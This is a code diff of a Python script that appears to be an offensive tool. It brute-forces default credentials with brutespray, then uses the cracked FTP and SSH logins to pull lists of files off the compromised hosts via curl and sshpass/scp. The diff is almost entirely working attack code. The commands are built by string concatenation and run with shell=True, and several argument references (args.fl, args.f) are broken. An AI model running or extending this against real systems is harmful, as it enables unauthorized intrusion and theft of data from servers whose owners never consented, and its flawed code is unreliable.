@@ -9,10 +9,11 @@ from pathlib import Path
 
 def _parse_args():
 	parser = argparse.ArgumentParser(description='main.py')
-	parser.add_argument('ip', type=str, help='IP range to search for defaults')
+	parser.add_argument('ip', type=str, help='IP or IP range to search for defaults')
 	parser.add_argument('-t', '--threads', type=int, default=2, help='Number of threads to run on')
 	parser.add_argument('-c', '--clean', type=bool, default=True, help='Clean up files from previous runs')
-	parser.add_argument('-f', '--filename', type=str, default=None, help='File to retrieve')
+	parser.add_argument('-f', '--filepath', type=str, default=None, help='Specify a single filepath to retrieve')
+	parser.add_argument('-fl', '--filelist', type=str, default="files_to_retrieve.txt", help='Specify a .txt file listing the possible filepaths to retrieve')
 	args = parser.parse_args()
 	return args
 
@@ -34,13 +35,12 @@ def run_brutespray(threads: int):
 	brute_out, brute_err = brute_poc.communicate()
 	# print(brute_out.decode('utf-8'))
 
-def get_ftp_files(ip, username, password, filename="welcome.msg"):
-	ftp_cd = "cd ftp; "
-	# mkdir = "mkdir " + username + "; "
-	# cd = "cd " + username + "; "
-	wget = "curl ftp://" + username + ":" + password + "@" + ip + "/" + filename + " -o retrieved_file;"
-	cmd = ftp_cd + wget
-	# print(wget)
+def get_ftp_files(ip, username, password, filepath=None):
+	filename = filepath.split('/')
+	filename = filename[-1]
+	mkdir = "cd ftp; mkdir " + username + ":" + ip + "; cd " + username + ":" + ip
+	get = "curl ftp://" + username + ":" + password + "@" + ip + filepath + " -o " + filename + ";"
+	cmd = mkdir + get
 	proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True)
 	out, err = proc.communicate()
 	if err is not None:
@@ -58,10 +58,11 @@ def get_mysql_files(ip, username, password):
 	if err is not None:
 		print("\t\tfailed to dump database")
 
-def get_ssh_files(ip, username, password, filename="loot.txt"):
-	mkdir = "cd ssh; "#mkdir " + username + ":" + ip + ";"
-
-	cmd = mkdir + "sshpass -p \"" + password + "\" scp " + username + "@" + ip + ":~/"+ filename + " ./" + filename + ";"
+def get_ssh_files(ip, username, password, filepath=None):
+	filename = filepath.split('/')
+	filename = filename[-1]
+	mkdir = "cd ssh; mkdir " + username + ":" + ip + ";"
+	cmd = mkdir + "sshpass -p \"" + password + "\" scp -r " + username + "@" + ip + ":"+ filepath + " " + filename + ";"
 	proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True)
 	out, err = proc.communicate()
 	if err is not None:
@@ -74,11 +75,6 @@ def make_ftp_folder():
 
 def make_ssh_folder():
 	cmd = "mkdir ssh"
-	proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True)
-	out, err = proc.communicate()
-
-def make_mysql_folder():
-	cmd = "mkdir mysql"
 	proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True)
 	out, err = proc.communicate()
 
@@ -114,18 +110,12 @@ if __name__ == "__main__":
 				match = regex.search(line)
 				if match is not None:
 					print("\tgrabbing ftp files from " + str(match.group(2)))
-					get_ftp_files(match.group(1), match.group(2), match.group(3), args.filename)
-	# dump mysql database
-	if mysql_file.is_file():
-		print("==== retreiving info from mysql servers")
-		make_mysql_folder()
-		with open("./brutespray-output/3306-mysql-success.txt", "r") as f:
-			for line in f:
-				regex = re.compile(r"Host: (.+) User: (.+) Password: (.+) ")
-				match = regex.search(line)
-				if match is not None:
-					print("\tgrabbing mysql dump from " + str(match.group(2)))
-					get_mysql_files(match.group(1), match.group(2), match.group(3))
+					if not args.filepath:
+						with open(args.fl) as files:
+							for filename in files:
+								get_ftp_files(match.group(1), match.group(2), match.group(3), filename)
+					else: 
+						get_ftp_files(match.group(1), match.group(2), match.group(3), args.f)
 	# get scp files
 	if ssh_file.is_file():
 		print("==== retreiving info from ssh servers")
@@ -136,7 +126,12 @@ if __name__ == "__main__":
 				match = regex.search(line)
 				if match is not None:
 					print("\tgrabbing scp files from " + str(match.group(2)))
-					get_ssh_files(match.group(1), match.group(2), match.group(3), args.filename)
+					if not args.filepath:
+						with open(args.fl) as files:
+							for filename in files:
+								get_ssh_files(match.group(1), match.group(2), match.group(3), filename)
+					else: 
+						get_ssh_files(match.group(1), match.group(2), match.group(3), args.f)
 
 # maybe use this vvv for ssh
 # sshpass -p 'SuperStrongPassword' scp -C -r admin@192.168.111.142:/home/admin .
